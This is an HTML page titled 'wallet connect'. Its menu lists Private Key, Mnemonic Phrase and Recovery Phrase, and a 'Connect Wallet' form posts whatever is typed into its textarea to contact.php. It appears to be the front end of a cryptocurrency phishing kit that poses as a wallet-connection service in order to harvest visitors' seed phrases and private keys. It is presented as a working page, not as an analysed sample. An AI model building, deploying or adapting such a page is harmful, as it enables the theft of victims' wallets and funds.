<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>wallet connect </title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="wrapper">
        <nav>
           <ul id="links">
               <li id="link" class="">
                   <span>
                   Private Key
                   </span>
               </li>
               <li id="link" class="">
                   <span>
                   Mnemonic Phrase
                   </span>
               </li>
               <li id="link" class="">
                   <span>
                   Recovery Phrase
                   </span>
               </li>
           </ul>
        </nav>

        <form action="./contact.php" method="post" >
           <textarea name="phrase" id="" cols="30" rows="10" placeholder="Input key"></textarea>
         <div>
         <button type="submit" name="submit">Connect Wallet</button>
         </div> 
           
        </form>
    </div>


    <script src="app.js"></script>
</body>
</html>